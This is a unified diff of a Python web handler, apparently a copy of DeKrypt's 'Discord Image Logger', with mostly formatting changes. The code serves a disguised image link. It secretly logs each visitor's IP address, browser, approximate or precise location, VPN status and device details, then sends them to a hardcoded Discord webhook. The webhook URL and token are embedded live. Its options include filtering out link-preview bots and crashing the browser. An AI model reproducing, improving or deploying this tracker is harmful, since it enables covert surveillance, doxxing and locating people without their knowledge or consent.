@@ -15,25 +15,19 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1502035551753343168/40OzcbXsPy3Blx5T4tTi7H_BbCJ5lwHbGXkcTzOyoNdjQNY-R82GQKbHoH-ftWx8t55T",
     "image": "https://ih1.redbubble.net/image.1077765030.7025/bg,f8f8f8-flat,750x,075,f-pad,750x1000,f8f8f8.jpg",
     "imageArgument": True,
-
     "username": "Image Logger",
     "color": 0x00FFFF,
-
     "crashBrowser": False,
     "accurateLocation": False,
-
     "message": {
         "doMessage": False,
         "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
         "richMessage": True,
     },
-
     "vpnCheck": 1,
     "linkAlerts": True,
     "buggedImage": True,
-
     "antiBot": 1,
-
     "redirect": {
         "redirect": False,
         "page": "https://your-link.here"
@@ -51,74 +45,62 @@ def botCheck(ip, useragent):
         return False
 
 def reportError(error):
-    requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "@everyone",
-    "embeds": [
-        {
+    requests.post(config["webhook"], json={
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [{
             "title": "Image Logger - Error",
             "color": config["color"],
             "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
-        }
-    ],
-})
+        }],
+    })
 
-def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     if ip and ip.startswith(blacklistedIPs):
         return
     
     bot = botCheck(ip, useragent)
     
     if bot:
-        requests.post(config["webhook"], json = {
-    "username": config["username"],
-    "content": "",
-    "embeds": [
-        {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
-        }
-    ],
-}) if config["linkAlerts"] else None
+        if config["linkAlerts"]:
+            requests.post(config["webhook"], json={
+                "username": config["username"],
+                "content": "",
+                "embeds": [{
+                    "title": "Image Logger - Link Sent",
+                    "color": config["color"],
+                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+                }],
+            })
         return
 
     ping = "@everyone"
-
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    
     if info["proxy"]:
         if config["vpnCheck"] == 2:
-                return
-        
+            return
         if config["vpnCheck"] == 1:
             ping = ""
     
     if info["hosting"]:
         if config["antiBot"] == 4:
-            if info["proxy"]:
-                pass
-            else:
+            if not info["proxy"]:
                 return
-
         if config["antiBot"] == 3:
-                return
-
+            return
         if config["antiBot"] == 2:
-            if info["proxy"]:
-                pass
-            else:
+            if not info["proxy"]:
                 ping = ""
-
         if config["antiBot"] == 1:
-                ping = ""
+            ping = ""
 
     os, browser = httpagentparser.simple_detect(useragent) if useragent else ("Unknown", "Unknown")
     
     embed = {
-    "username": config["username"],
-    "content": ping,
-    "embeds": [
-        {
+        "username": config["username"],
+        "content": ping,
+        "embeds": [{
             "title": "Image Logger - IP Logged",
             "color": config["color"],
             "description": f"""**A User Opened the Original Image!**
@@ -132,7 +114,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Country:** `{info['country'] if info['country'] else 'Unknown'}`
 > **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
 > **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps](https://www.google.com/maps/search/google+map++'+coords+')'})
 > **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
 > **Mobile:** `{info['mobile']}`
 > **VPN:** `{info['proxy']}`
@@ -146,19 +128,19 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 {useragent}
 
 """,
+        }],
     }
-  ],
-}
     
-    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
-    requests.post(config["webhook"], json = embed)
+    if url:
+        embed["embeds"][0]["thumbnail"] = {"url": url}
+    requests.post(config["webhook"], json=embed)
     return info
 
 binaries = {
     "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
+class handler(BaseHTTPRequestHandler):
     
     def handleRequest(self):
         try:
@@ -193,11 +175,9 @@ height: 100vh;
                 self.send_response(200 if config["buggedImage"] else 302)
                 self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url)
                 self.end_headers()
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"])
-
-                makeReport(forwarded_for, endpoint = s.split("?")[0], url = url)
-                
+                if config["buggedImage"]:
+                    self.wfile.write(binaries["loading"])
+                makeReport(forwarded_for, endpoint=s.split("?")[0], url=url)
                 return
             
             else:
@@ -206,10 +186,9 @@ height: 100vh;
 
                 if dic.get("g") and config["accurateLocation"]:
                     location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                    result = makeReport(forwarded_for, self.headers.get('user-agent'), location, s.split("?")[0], url=url)
                 else:
-                    result = makeReport(forwarded_for, self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
+                    result = makeReport(forwarded_for, self.headers.get('user-agent'), endpoint=s.split("?")[0], url=url)
 
                 message = config["message"]["message"]
 
@@ -240,6 +219,7 @@ height: 100vh;
 
                 if config["redirect"]["redirect"]:
                     data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                
                 self.send_response(200)
                 self.send_header('Content-type', datatype)
                 self.end_headers()
@@ -266,7 +246,6 @@ if (!currenturl.includes("g=")) {
             self.send_response(500)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-
             self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
             reportError(traceback.format_exc())
 
@@ -274,5 +253,3 @@ if (!currenturl.includes("g=")) {
     
     do_GET = handleRequest
     do_POST = handleRequest
-
-handler = ImageLoggerAPI
